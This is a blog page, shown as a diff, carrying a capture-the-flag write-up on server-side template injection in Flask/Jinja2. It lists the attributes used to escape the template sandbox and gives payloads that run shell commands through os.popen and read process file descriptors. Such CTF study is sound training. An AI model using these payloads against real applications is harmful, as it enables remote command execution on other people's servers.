@@ -1,0 +1,1383 @@
+<!DOCTYPE html>
+
+<head>
+	
+	<title>SSTI - wanan</title>
+	<meta charset="utf-8">
+	
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+	
+	<meta name="description" content="web361SSTI原理SSTi学习 SSTI沙盒逃逸 网址输入“{undefined{7+7}}”页面显示14，说面存在“SSTI” ： SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI">
+<meta property="og:url" content="https://lovewanan.github.io/ctfshow/ctf.show/SSTI/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="web361SSTI原理SSTi学习 SSTI沙盒逃逸 网址输入“{undefined{7+7}}”页面显示14，说面存在“SSTI” ： SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako">
+<meta property="og:locale">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281906623.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281917579.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281919739.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281920069.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281921506.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281922424.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281924934.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281925083.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281926393.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281930568.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281936748.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281937923.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311649320.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650851.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650151.png">
+<meta property="article:published_time" content="2022-04-17T14:37:17.279Z">
+<meta property="article:modified_time" content="2022-04-18T07:30:51.980Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="ctf.show">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281906623.png">
+
+	<meta name="theme-color" content="#5e72e4">
+	<meta name="theme-color-rgb" content="94,114,228">
+	<meta name="theme-color-origin" content="#5e72e4">
+	<meta name="argon-enable-custom-theme-color" content="true">
+	<meta name="theme-card-radius" content="4">
+	<meta name="theme-version" content="1.0.2">
+	<link rel="icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
+	<link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
+
+	
+<link rel="stylesheet" href="/assets/argon_css_merged.css">
+
+	
+<link rel="stylesheet" href="/style.css">
+
+	
+<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">
+
+	
+<script src="/assets/argon_js_merged.js"></script>
+
+	
+<script src="/assets/js/argon.min.js"></script>
+
+	
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+	
+
+	<script>
+		var argonConfig = {
+			language: "zh_CN",
+			
+				zoomify: {
+					duration: 200,
+					easing: "cubic-bezier(0.4,0,0,1)",
+					scale: 0.9
+				},
+			
+			pangu: "false",
+			
+				lazyload: {
+					threshold: 800,
+					effect: "fadeIn"
+				},
+			
+			disable_pjax: false,
+			headroom: false
+		}
+	</script>
+	<script>
+		var darkmodeAutoSwitch = "false";
+		function setDarkmode(enable){
+			if (enable == true){
+				$("html").addClass("darkmode");
+			}else{
+				$("html").removeClass("darkmode");
+			}
+			$(window).trigger("scroll");
+		}
+		function toggleDarkmode(){
+			if ($("html").hasClass("darkmode")){
+				setDarkmode(false);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
+			}else{
+				setDarkmode(true);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
+			}
+		}
+		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
+			setDarkmode(true);
+		}
+		function toggleDarkmodeByPrefersColorScheme(media){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			if (media.matches){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		function toggleDarkmodeByTime(){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			let hour = new Date().getHours();
+			if (hour < 7 || hour >= 22){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		if (darkmodeAutoSwitch == 'system'){
+			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
+			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
+			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
+		}
+		if (darkmodeAutoSwitch == 'time'){
+			toggleDarkmodeByTime();
+		}
+		if (darkmodeAutoSwitch == 'alwayson'){
+			setDarkmode(true);
+		}
+
+		function toggleAmoledDarkMode(){
+			$("html").toggleClass("amoled-dark");
+			if ($("html").hasClass("amoled-dark")){
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
+			}else{
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
+			}
+		}
+		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
+			$("html").addClass("amoled-dark");
+		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
+			$("html").removeClass("amoled-dark");
+		}
+	</script>
+	<script>
+		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
+			$("html").addClass("using-safari");
+		}
+	</script>
+
+	
+		
+<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>
+
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+
+<style id="themecolor_css">
+	
+	:root{
+		--themecolor: #5e72e4;
+		--themecolor-dark0: #5368E2;
+		--themecolor-dark: #485FE0;
+		--themecolor-dark2: #324CDD;
+		--themecolor-dark3: #233DD2;
+		--themecolor-light: #8A98EB;
+		--themecolor-rgbstr: 94,114,228;
+		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);
+
+	}
+</style>
+<style id="theme_cardradius_css">
+	:root{
+		--card-radius: 4px;
+	}
+</style>
+
+<body>
+<div id="toolbar">
+	<header class="header-global">
+		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
+			<div class="container">
+				
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon"></span>
+				</button>
+				<a class="navbar-brand" href="/">wanan</a>
+				<div class="navbar-collapse collapse" id="navbar_global">
+					<div class="navbar-collapse-header">
+						<div class="row">
+							<div class="col-6 collapse-brand"></div>
+							<div class="col-6 collapse-close">
+								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+									<span></span>
+									<span></span>
+								</button>
+							</div>
+						</div>
+					</div>
+					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+					
+							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
+								
+										<li class='nav-item'>
+											<a href='/' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>首页</span>
+											</a>
+											
+										</li>
+									
+										<li class='nav-item dropdown'>
+											<a href='' class='nav-link' onclick='return false;' data-toggle='dropdown' no-pjax>
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>分类</span>
+											</a>
+											
+													<div class="dropdown-menu">
+														
+															<a href='/categories/ctf/' class='dropdown-item'>ctf</a>
+														
+															<a href='/categories/ctf/sql%E6%B3%A8%E5%85%A5/' class='dropdown-item'>sql注入</a>
+														
+															<a href='/categories/java%E7%9F%A5%E8%AF%86/' class='dropdown-item'>java知识</a>
+														
+															<a href='/categories/ctf/php%E7%9F%A5%E8%AF%86' class='dropdown-item'>php知识</a>
+														
+															<a href='/categories/BUUCTF' class='dropdown-item'>BUUCTF</a>
+														
+															<a href='/categories/Linux' class='dropdown-item'>Linux</a>
+														
+															<a href='/categories/ctfshow' class='dropdown-item'>ctf.show</a>
+														
+													</div>
+												
+										</li>
+									
+							</ul>
+						
+					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+				</div>
+				
+				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
+			</div>
+		</nav>
+	</header>
+</div>
+<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">搜索</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<!-- TODO -->
+<div class="form-group mb-3">
+	<div class="input-group input-group-alternative">
+		<div class="input-group-prepend">
+			<span class="input-group-text"><i class="fa fa-search"></i></span>
+		</div>
+		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
+	</div>
+	<div id="local-search-result"></div>
+</div>
+
+			</div>
+		</div>
+	</div>
+</div>
+<!--Banner-->
+<section id="banner" class="banner section section-lg section-shaped">
+	<div class="shape shape-style-1 shape-primary">
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+	</div>
+
+	
+	<div id="banner_container" class="banner-container container text-center">
+		
+			<div class="banner-title text-white"><span class="banner-title-inner">wanan</span>
+		
+		</div>
+	</div>
+	
+		<style>
+			section.banner{
+				background-image: url(/assets/img/banner.jpg) !important;
+			}
+		</style>
+	
+</section>
+
+
+	<style>
+		#content:before {
+			content: '';
+			display: block;
+			position: fixed;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			z-index: -2;
+			background: url(/assets/img/banner.jpg);
+			background-position: center;
+			background-size: cover;
+			background-repeat: no-repeat;
+			opacity: 1;
+			transition: opacity .5s ease;
+		}
+		html.darkmode #content:before{
+			filter: brightness(0.65);
+		}
+		
+			#content:after {
+				content: '';
+				display: block;
+				position: fixed;
+				left: 0;
+				right: 0;
+				top: 0;
+				bottom: 0;
+				z-index: -2;
+				background: url(/assets/img/banner.jpg);
+				background-position: center;
+				background-size: cover;
+				background-repeat: no-repeat;
+				opacity: 0;
+				transition: opacity .5s ease;
+			}
+			html.darkmode #content:after {
+				opacity: 1;
+			}
+			html.darkmode #content:before {
+				opacity: 0;
+			}
+		
+		
+			#banner, #banner .shape {
+				background: transparent !important;
+			}
+		
+	</style>
+
+
+
+
+<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
+	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
+		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
+		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
+	</button>
+	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
+		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
+	</button>
+	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" <-% theme.fab_show_gotocomment_button ? "" : "style='display: none;'"  aria-label="Comment" tooltip="评论">
+		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
+	</button>
+	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_darkmode_button ? "" : "style='display: none;'"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
+		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
+	</button>
+	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_settings_button ? "" : "style='display: none;'"  aria-label="Open Blog Settings Menu" tooltip="设置">
+		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
+	</button>
+	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
+		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
+		<div class="blog-setting-item mt-3">
+			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
+			<div style="flex: 1;"></div>
+			<label id="blog_setting_darkmode_switch" class="custom-toggle">
+				<span class="custom-toggle-slider rounded-circle"></span>
+			</label>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">字体</div>
+			<div>
+				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">阴影</div>
+			<div>
+				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3 mb-3">
+			<div style="flex: 1;">滤镜</div>
+			<div id="blog_setting_filters" class="ml-3">
+				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
+				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
+				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
+				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mb-3">
+			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
+			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
+				<div id="blog_setting_card_radius"></div>
+			</div>
+		</div>
+		
+			<div class="blog-setting-item mt-1 mb-3">
+				<div style="flex: 1;">主题色</div>
+				<div id="theme-color-picker" class="ml-3"></div>
+			</div>
+		
+	</div>
+	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
+		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
+	</button>
+	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
+		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
+		<span id="fabtn_reading_progress_details">0%</span>
+	</button>
+</div>
+
+<div id="content" class="site-content">
+
+
+	<script src="https://cdn.jsdelivr.net/npm/@waline/client"></script>
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+		  var hm = document.createElement("script");
+		  hm.src = "https://hm.baidu.com/hm.js?853baf6befa4784c85c2f47223a04efb" ;
+		  var s = document.getElementsByTagName("script")[0]; 
+		  s.parentNode.insertBefore(hm, s);
+		})();
+		</script>
+		
+
+
+
+
+
+
+<div class="page-information-card-container">
+	
+</div>
+
+<div id="sidebar_mask"></div>
+<aside id="leftbar" class="leftbar widget-area" role="complementary">
+		
+		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
+			<div class="leftbar-banner card-body">
+				<span class="leftbar-banner-title text-white">wanan</span>
+				
+				
+			</div>
+			
+			
+				<ul id='leftbar_part1_menu' class='leftbar-menu'>
+					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li>
+				</ul>
+			
+			<div class="card-body text-center leftbar-search-button">
+				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
+					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
+				</button>
+			</div>
+		</div>
+		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
+			<div id="leftbar_part2_inner" class="card-body">
+				
+				<div class="nav-wrapper" style="padding-top: 5px;">
+	                <ul class="nav nav-pills nav-fill" role="tablist">
+						
+							<li class="nav-item sidebar-tab-switcher">
+								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
+							</li>
+						
+						<li class="nav-item sidebar-tab-switcher">
+							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
+						</li>
+	                </ul>
+				</div>
+				<div>
+					<div class="tab-content" style="padding: 10px 10px 0 10px;">
+						
+							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
+								<div id="leftbar_catalog"></div>
+								<script type="text/javascript">
+									$(function () {
+										$(document).headIndex({
+											articleWrapSelector: '#post_content',
+											indexBoxSelector: '#leftbar_catalog',
+											subItemBoxClass: "index-subItem-box",
+											itemClass: "index-item",
+											linkClass: "index-link",
+											offset: 80,
+										});
+									})
+								</script>
+								
+							</div>
+						
+						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
+							<img id="leftbar_overview_author_image" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
+							<h6 id="leftbar_overview_author_name">wanan</h6>
+							<nav class="site-state">
+								<div class="site-state-item site-state-posts">
+									<a href="/archives">
+										<span class="site-state-item-count">58</span>
+										<span class="site-state-item-name">文章</span>
+									</a>
+								</div>
+								<div class="site-state-item site-state-categories">
+									<a data-toggle="modal" data-target="#blog_categories">
+										<span class="site-state-item-count">7</span>
+										<span class="site-state-item-name">分类</span>
+									</a>
+								</div>      
+								<div class="site-state-item site-state-tags">
+									<a data-toggle="modal" data-target="#blog_tags">
+										<span class="site-state-item-count">7</span>
+										<span class="site-state-item-name">标签</span>
+									</a>
+								</div>
+							</nav>
+							
+									<div class="site-author-links">
+										
+									</div>
+								
+							
+									<div class='site-friend-links'>
+										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
+										<ul class='site-friend-links-ul'>
+											
+												<li class='site-friend-links-item'>
+													<a href='https://argon-docs.solstice23.top/#/' rel='noopener' target='_blank'>Argon</a>
+												</li>
+											
+										</ul>
+									</div>
+								
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+</aside>
+<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">分类</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/categories/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/categories/ctf/" rel="tag">ctf <span class="tag-num">26</span></a><a class="badge badge-secondary tag" href="/categories/ctfshow/" rel="tag">ctfshow <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/categories/java%E7%9F%A5%E8%AF%86/" rel="tag">java知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/php%E7%9F%A5%E8%AF%86/" rel="tag">php知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">2</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">标签</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/tags/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/tags/bugctf/" rel="tag">bugctf <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/tags/ctf-show/" rel="tag">ctf.show <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/xctf/" rel="tag">xctf <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界 <span class="tag-num">9</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<div id="primary" class="content-area">
+	<main id="main" class="site-main" role="main">
+		
+		
+			
+	<article class="post post-full card bg-white shadow-sm border-0 ">
+	<header class="post-header text-center">
+		
+		<a class="post-title" href="/ctfshow/ctf.show/SSTI/">SSTI</a>
+		<div class="post-meta">
+			
+						
+						<div class="post-meta-detail post-meta-detail-time">
+							<i class="fa fa-clock-o" aria-hidden="true"></i>
+							<time title="发布于 2022-4-17 22:37:17 | 编辑于 2022-4-18 15:30:51">2022-4-17 22:37
+							</time>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-categories">
+							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
+							<a class="post-meta-detail-catagory-link" href="/categories/ctfshow/">ctfshow</a>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa fa-book" aria-hidden="true"></i>
+							<span id="busuanzi_container_page_pv">
+								阅读<span id="busuanzi_value_page_pv"></span>次
+							</span>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa-file-word-o" aria-hidden="true"></i>
+							4.9k 字
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-readingtime">
+							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
+							23 分钟
+						</div>
+					
+		</div>
+		
+	</header>
+
+	<div class="post-content" id="post_content">
+		<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><h2 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h2><p><a target="_blank" rel="noopener" href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">SSTI沙盒逃逸</a></p>
+<p>网址输入“{undefined{7+7}}”页面显示14，说面存在“SSTI” ：</p>
+<p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>常用方法</strong></p>
+<pre><code>__class__           查看对象所在的类
+__mro__             查看继承关系和调用顺序，返回元组
+__base__            返回基类
+__bases__           返回基类元组
+__subclasses__()    返回子类列表
+__init__            调用初始化函数，可以用来跳到__globals__
+__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典
+__builtins__        返回内建内建名称空间字典
+__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）        都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
+__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
+__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
+url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app
+lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;
+&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;
+current_app          应用上下文，一个全局变量
+request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
+request.args.x1        get传参
+request.values.x1      所有参数
+request.cookies      cookies参数
+request.headers      请求头参数
+request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
+request.data           post传参    (Content-Type:a/b)
+request.json         post传json  (Content-Type: application/json)
+config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;
+</code></pre>
+<p><strong>过滤器</strong></p>
+<pre><code>int()        将值转换为int类型；
+
+float()        将值转换为float类型；
+
+lower()        将字符串转换为小写；
+
+upper()        将字符串转换为大写；
+
+title()        把值中的每个单词的首字母都转成大写；
+
+capitalize()    把变量值的首字母转成大写，其余字母转小写；
+
+trim()        截取字符串前面和后面的空白字符；
+
+wordcount()    计算一个长字符串中单词的个数；
+
+reverse()    字符串反转；
+
+replace(value,old,new)    替换将old替换为new的字符串；
+
+truncate(value,length=255,killwords=False)    截取length长度的字符串；
+
+striptags()    删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
+
+escape()或e    转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。
+
+safe()        禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；
+
+list()        将变量列成列表；
+
+string()    将变量转换成字符串；
+
+join()        将一个序列中的参数值拼接成字符串。示例看上面payload；
+
+abs()        返回一个数值的绝对值；
+
+first()        返回一个序列的第一个元素；
+
+last()        返回一个序列的最后一个元素；
+
